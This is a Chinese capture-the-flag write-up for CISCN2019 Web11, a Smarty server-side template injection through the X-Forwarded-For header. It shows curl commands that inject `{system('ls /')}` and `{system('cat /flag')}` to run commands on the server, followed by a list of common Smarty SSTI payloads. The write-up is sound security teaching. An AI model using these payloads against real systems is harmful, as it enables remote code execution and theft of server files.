# [CISCN2019 华东南赛区]Web11

## 题目概述
题目是一个 IP 地址查询 API 网站，页面底部提示 "Build With Smarty !"，暗示使用 Smarty 模板引擎。

## 信息收集
1. 访问首页，发现页面显示当前 IP 地址
2. 页面底部提示：`Build With Smarty !`
3. 测试 XFF 头发现 IP 显示在页面上，且 XFF 头内容可控
4. 测试 `{$smarty.version}` 返回 `3.1.30`，确认 Smarty 版本

## 漏洞分析（漏洞类型、原理、判断过程）
**漏洞类型**：Smarty 服务端模板注入（SSTI）

**原理**：
- Smarty 是 PHP 的模板引擎，支持在模板中使用 `{function()}` 语法调用函数
- X-Forwarded-For 头的值被直接传入 Smarty 模板渲染
- Smarty 的 `{system()}` 函数可以直接执行系统命令

**判断过程**：
1. 页面底部提示使用 Smarty 模板引擎
2. XFF 头内容显示在页面上，存在注入点
3. 测试 `{$smarty.version}` 成功返回版本号，确认 SSTI 漏洞

## 利用过程（Payload + Flag）

**步骤 1**：确认 Smarty 版本
```bash
curl -s -H "X-Forwarded-For: {\$smarty.version}" "http://target/"
# 返回: 3.1.30
```

**步骤 2**：执行命令列出根目录
```bash
curl -s -H "X-Forwarded-For: {system('ls /')}" "http://target/"
# 返回: bin dev etc flag home lib ...
```

**步骤 3**：读取 flag
```bash
curl -s -H "X-Forwarded-For: {system('cat /flag')}" "http://target/"
# 返回: flag{92524052-0455-46eb-aa49-1a5a76b29736}
```

## 复现步骤
1. 访问题目 URL，观察页面特征
2. 发现 Smarty 模板引擎提示
3. 构造 XFF 头注入 Smarty 模板语法
4. 使用 `{system('cat /flag')}` 获取 flag

## 技术总结（表格：漏洞类型/攻击入口/核心Payload/知识点）

| 漏洞类型 | 攻击入口 | 核心 Payload | 知识点 |
|---------|---------|-------------|--------|
| SSTI | X-Forwarded-For 头 | `{system('cmd')}` | Smarty 模板语法、PHP 函数调用 |

## 知识总结（解题技巧、同类题型套路）
1. **识别模板引擎**：页面底部、错误信息、特定语法测试
2. **Smarty SSTI 常用 Payload**：
   - `{$smarty.version}` - 获取版本
   - `{system('cmd')}` - 执行系统命令
   - `{phpinfo()}` - 执行 PHP 函数
3. **注入点探测**：HTTP 头（XFF、User-Agent、Referer）是常见注入点
